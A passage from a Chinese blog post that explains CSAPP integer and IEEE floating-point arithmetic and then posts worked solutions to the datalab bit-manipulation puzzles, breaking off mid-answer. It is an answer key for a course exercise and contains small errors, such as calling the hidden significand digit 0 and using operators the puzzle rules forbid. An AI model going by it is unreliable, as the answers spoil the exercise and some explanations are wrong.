href="#无符号乘法" class="headerlink" title="无符号乘法"></a>无符号乘法</h4><p>对于乘法有 <code>x*y=(x*y) mod 2^w</code> 其中 <code>w</code> 为 <code>x </code> 和 <code>y</code> 的位数。因为 <code>x</code> 和 <code>y</code> 相乘可能得到最大 <code>2w</code> 位的整数，因此会发生截断，对于无符号来说，截断就相当于对 <code>2^w</code> 取模 。</p><h4 id="补码乘法"><a href="#补码乘法" class="headerlink" title="补码乘法"></a>补码乘法</h4><p>这个乘法就相当于先像无符号乘法，乘出来截断之后再转为补码就是结果。</p><h4 id="乘常数"><a href="#乘常数" class="headerlink" title="乘常数"></a>乘常数</h4><p>因为我们知道一个特性：移位运算相当于对 <code>2^x</code> 做乘除法，因此利用这个特性我们能把乘法转成移位运算，执行乘法指令的时间比其它指令时间要长的多，因此很多编译器在编译常数乘法的时候会把常数二进制拆开然后分别相乘相加。</p><p>比如乘9：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>=<span class="number">0b1001</span></span><br><span class="line">x*<span class="number">9</span>=x*<span class="number">8</span>+x*<span class="number">1</span>=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p> 但是我们会发现一个问题：如果1的位数很多那就相当于要做很多次移位和加法，最后的复杂度可能跟乘法指令差不多，但是我们可以通过另外一种姿势避免这个问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span>=<span class="number">0b1111</span>=<span class="number">0b10000</span><span class="number">-0b</span>1</span><br><span class="line">x*<span class="number">15</span>=x*<span class="number">16</span>-x*<span class="number">1</span>=(x&lt;&lt;<span class="number">4</span>)-(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>通过借一个高位，其余位权值取反之后再加1的方式避免了进行大量的运算。</p><h4 id="除2的幂"><a href="#除2的幂" class="headerlink" title="除2的幂"></a>除2的幂</h4><p>对于2的幂，非常简单，右移运算即可，但是需要注意：除法没有分配律，所以乘常数的方式并不适用于除法。除法会向零取整，比如算出来结果为 <code>3.5</code> 则会变成 <code>3</code>，算出来结果 <code>-3.5</code> 则会变成 <code>-3</code>。</p><h3 id="浮点数表示"><a href="#浮点数表示" class="headerlink" title="浮点数表示"></a>浮点数表示</h3><p>显然整数并不能满足我们平时的需要，平时还需要进行大量的浮点数运算，达到太阳的质量，小到电子的质量，都需要能在计算机中表示。而这个范围要用整数的思路表示显然是不行的，因此我们需要有特殊的表示方法。</p><h4 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h4><p>我们都知道十进制的小数，小数点左边的数字位的权值从 <code>10^0</code> 开始，指数逐位递增，而小数点右边的数字的位的权值从 <code>10^(-1)</code> 开始，逐位递减。</p><p>二进制同理，只不过权值的底数都变成了 <code>2</code>。</p><h4 id="IEEE浮点数表示"><a href="#IEEE浮点数表示" class="headerlink" title="IEEE浮点数表示"></a>IEEE浮点数表示</h4><p>这个标准规定的浮点数用如下方式表示：</p><p><img src="/2022/06/03/CSAPP_Datalab/5.png" alt="5"></p><p>里面包含了</p><ul><li>符号(s)：<code>1</code> 表示负数，<code>0</code> 表示正数</li><li>尾数(M)：是一个二进制的小数，取值范围为 <code>[1,2)</code></li><li>阶码(E)：为浮点数加权。</li></ul><p>其实这个定义就相当于二进制的科学计数法，想想原来科学计数法的定义是不是能更清晰地理解它了呢？</p><p>讲完理论来讲点实际的：</p><p>我们知道实际上我们经常用的浮点数有两类，一类是 <code>float</code> 一类是 <code>double</code>，<code>float</code> 为 <code>32</code> 位，<code>double</code> 为 <code>64</code> 位。</p><ul><li>对于 <code>float</code>，最高位表示符号位，第 <code>2</code> 到第 <code>9</code> 位表示阶码，第 <code>10</code> 位到第 <code>32</code> 位均为尾数</li><li>对于 <code>double</code>，最高位表示符号位，第 <code>2</code> 到第 <code>12</code> 位表示阶码，第 <code>13</code> 位到第 <code>64</code> 位均为尾数</li></ul><p>我们具体以 <code>float</code> 来分析：</p><p>第一位是符号位没啥大问题。后面的八位是指数，这个指数需要能表示无穷大，也要能表示无穷小，因此指数必须有正有负。我们定义一个数 <code>Bias=2^(k-1)-1</code> 其中 <code>k</code> 为阶码的位数，在 <code>float</code> 中，这个值为 <code>127</code>，在 <code>double</code> 中，这个值为 <code>1023</code>。阶码实际值 <code>E=e-Bias</code>，其中 <code>e</code> 表示阶码本身的无符号二进制的数值。然后就是这个尾数了，因为我们的范围是 <code>[1,2)</code>，在这个范围内的小鼠，不难发现小数点前有一位一直是 <code>0</code>，因此这个 <code>0</code> 我们就不必多花一位存储它了，因此我们的尾数都是小数点后的值。</p><p>如果一个 <code>32</code> 位浮点数在内存中的二进制表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin:<span class="number">0b01000000010000000000000000000</span></span><br><span class="line">hex:<span class="number">0x40400000</span></span><br></pre></td></tr></table></figure><p>那么可以发现它是正数，阶码为 <code>128</code>，尾数为 <code>100000……</code>，因为小数点后面的0都能忽略，因此尾数实际就是 <code>1</code>。然后注意这个阶码并不是真正的实际值，这只是它表面上看上去的值，再给它减去一个 <code>127</code> 之后可以发现指数为 <code>1</code>。小数位数因为有一个隐含的 <code>1</code>，所以它的实际值为 <code>1.1</code>，十进制值就是 <code>1.5</code>，所以最后结果就是 <code>1.5*2^1=3</code>。</p><p>然后我们再运行程序看看 <code>3</code> 的字节显示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x=<span class="number">3.0</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后可以发现与我们上面书写的十六进制值一致。</p><p>浮点数还有 <code>3 </code>中表示值的情况。</p><ol><li>规格化的值：这是最普遍的情况，阶码位不为全 <code>0</code> 也不为全 <code>1</code>.</li><li>非规格化的值：当阶码位全为 <code>0</code> 的时候，表示非规格化的值，这个非规格化的意思就是跟我们上面介绍的规律稍稍有点不一样，此时尾数是不带隐含的 <code>1</code> 的，也就是说它的有效数字直接是从尾数开始的，因此它和阶码位模式为<code>00000001</code> 的指数一样，但是有效数字多一个小数点前的 <code>1</code>，因为这样表示能够使得非规格化数值向规格化数值转化更为平滑。</li><li>特殊值：包括 <code>INF</code> 和 <code>NAN</code>，阶码位全为 <code>1</code> 的时候，若尾数全为0，则得到 <code>INF</code>，若不全为 <code>0</code> 则得到 <code>NAN</code>。</li></ol><h4 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h4><p>浮点数因为表达的不是一个具体的数，只是一个近似值，因此在精度不够的情况，只能选择舍掉一些精度保证能够存储。如何舍入便成为了一项难题，目前一共有四种舍入方式：下面我们给出一些例子</p><table><thead><tr><th>方式</th><th>1.40</th><th>1.60</th><th>1.50</th><th>2.50</th><th>-1.50</th></tr></thead><tbody><tr><td>向偶数舍入</td><td>1</td><td>2</td><td>2</td><td>2</td><td>-2</td></tr><tr><td>向零舍入</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-1</td></tr><tr><td>向下舍入</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-2</td></tr><tr><td>向上舍入</td><td>2</td><td>2</td><td>2</td><td>3</td><td>-1</td></tr></tbody></table><p>后面三个方式还好，应该都能理解，主要是这个向偶数舍入，它首先满足：被舍入的值不超过最小单位的一半则丢弃，若超过一半则加上一个最小单位，若等于一半则一定会使得舍入的结果为偶数个最小计量单位。</p><h4 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h4><p>在进行浮点数加减法的时候，首先需要对阶，小阶向大阶对齐，然后尾数相加。由于特殊值的存在，浮点数加减法并不满足交换规则，因此它不是一个阿贝尔群，很多整数规律不适用。</p><p>比如最经典的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1e111-1e111!=1e111-1e111+1</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>这里来回答一下之前遗留的一个问题，那就是为什么整数转为浮点数之后会有部分位相匹配。其实不难发现是因为浮点数的尾数基本是和原二进制的值一致的。比如下面的一个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1001001010101</span><br></pre></td></tr></table></figure><p>转为浮点数之后就会变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.001001010101*2^12</span><br></pre></td></tr></table></figure><p>这个尾数是与原二进制的值一致的，想到这里你肯定明白了之前的那个问题了。</p><h2 id="CSAPP-datalab"><a href="#CSAPP-datalab" class="headerlink" title="CSAPP:datalab"></a>CSAPP:datalab</h2><p>终于到了最激动的实验环节了，原先我对这本书并没有很深的了解，直接上手做的实验，不会就搜，现在看完一遍之后感觉理解很多，做实验基本也是畅通无阻。</p><p>用给定的运算符实现函数的功能，解压得到源码之后在 <code>bits.c</code> 中编写自己的代码，然后要查看结果可以使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$make</span><br><span class="line">$./btest</span><br></pre></td></tr></table></figure><p>实验规定并非强制，但是想获得提升还是严格遵守它给定的条件。</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只允许使用位运算 <code>~</code> 和 <code>&amp;</code> 实现按位异或，这个我们在上面有写过，只不过没有合在一起，稍微转换一下即可，反正实现的思想就是要位之间不一样才返回 <code>1</code>。</p><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~(~x&amp;y)&amp;~(x&amp;~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得整数的最小值，最小值就是我们喜闻乐见的 <code>-2147483648</code> 啦，但是我们稍微转换一下思路，最小就是最高位一个0，用个 <code>1</code>，然后移位运算把它移到最高位即可。</p><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断 <code>x</code> 是否为最大值，最大值应该是最小值取反，然后判断是否一样我们使用异或运算，异或只有在两边相等时才返回 <code>0</code>，我们用非运算符反一下就可以了。</p><h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((~(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))^x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断 <code>x</code> 是否奇数位上全为 <code>1</code>。全 <code>1</code> 我们直接用一个立即数好了 <code>0xAAAAAAAA</code>，然后与屏蔽偶数位之后判断是否相等即可。</p><h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((<span class="number">0xAAAAAAAA</span>&amp;x)^<span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现对一个数取负，取负的话就是取反再加一即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断一个整数是否在 <code>ASCII</code> 码的数字位置，再转换一下就是满足这个条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="number">-0x30</span>&gt;=<span class="number">0</span>  &amp;&amp; x<span class="number">-0x3a</span>&lt;<span class="number">0</span></span><br></pre></td></tr></table></figure><p>我们的目标就是判断 <code>x-0x30</code> 是否为非负数，<code>x-0x3a</code> 是否为负数，也许需要考虑溢出，但是结果发现不需要，因为这个是两边判断的。</p><h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;<span class="comment">//x-0x30&gt;=0  &amp;&amp; x-0x3a&lt;0</span></span><br><span class="line"><span class="keyword">return</span> !((x+(~<span class="number">0x30</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))&amp;!!((x+(~<span class="number">0x3a</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于实现运算 <code>x?y:z</code>，如果 <code>x</code> 为 <code>0</code> 则返回 <code>x</code>，如果不为 <code>0</code> 则返回 <code>y</code>。</p><p>我们先把 <code>x</code>取值变为只有 <code>0</code> 和 <code>-1</code>。用掩码的思路，如过结果为 <code>-1</code> 则说明位模式全为 <code>1</code>，相与的结果就是另一个数本身，如果是 <code>0</code> 则不论与谁结果都是 <code>0</code>，我们让 <code>x</code> 与 <code>y</code>，让 <code>~x</code> 与 <code>z</code>，最后得到的两个值或起来即可。<code>x</code> 如果是 <code>-1</code> 则返回 <code>y</code> ，如果是 <code>0</code> 则返回 <code>z</code>。得到 <code>x</code> 我们只要非两次，再取负即可，就达到了我们的要求了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">x=~(!!x)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现一个小于等于的功能，这里需要注意的是不能直接相减，会有溢出。</p><p>因此我们选择先判断符号位，符号位一致再相减一定不会溢出，符号不一致则强行返回不一致的结果，一致则返回直接相减的结果。首先我们先拿两个变量保存符号的结果，然后再判断符号是否一致，一致则屏蔽符号的结果，不一致则屏蔽相减的结果。</p><p>这里好好再理解一下，仔细看 <code>signx^signy</code> 和 <code>!(signx^signy)</code> 如何起到屏蔽答案的效果。</p><h4 id="答案-5"><a href="#答案-5" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;<span class="comment">//y-x&gt;=0</span></span><br><span class="line">    <span class="keyword">int</span> signx=!(x&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> signy=!(y&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> sign=(signx^signy)&amp;signy;<span class="comment">//若不一致则返回y是否为非负数</span></span><br><span class="line">    x=x&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    y=y&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">return</span> sign|(!(((y+(~x+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))))&amp;(!(signx^signy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现逻辑非的功能，我们这里需要研究一下 <code>0</code> 的特性，<code>0</code> 是除了 <code>TMIN</code> 以外的负数值等于自己本身的数了。然后再判断一下最高位即可。</p><h4 id="答案-6"><a href="#答案-6" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span 